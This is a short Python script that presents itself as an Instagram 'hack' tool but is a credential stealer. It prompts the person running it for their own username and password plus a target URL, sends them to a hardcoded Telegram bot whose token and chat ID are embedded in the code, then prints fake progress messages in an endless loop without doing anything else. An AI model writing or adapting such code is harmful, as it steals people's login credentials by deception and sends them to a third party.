import requests
import os
import time as t
youruser = input("user  : ")
yourpassword = input("password :")
Target = input("url Target : ")
inpu = input("Sleep :  ")
bot_token = '1388819333:AAGFnk1sa1xjvGnRDhlHNqgMqfh6NtjC4_g'
yourid = '1248694389'
send_text = f'https://api.telegram.org/bot{bot_token}/sendMessage?chat_id={yourid}&parse_mode=Markdown&text=new Hack insta \n user:{youruser}\n password:{yourpassword}\n target:{Target}\nSleep:{inpu}'

res = requests.get(send_text)
print("\n")
print("Loading •/•")
print("\n")
while True:
			t.sleep(0.5)
			print("Done ✅")
print("Done......!!")


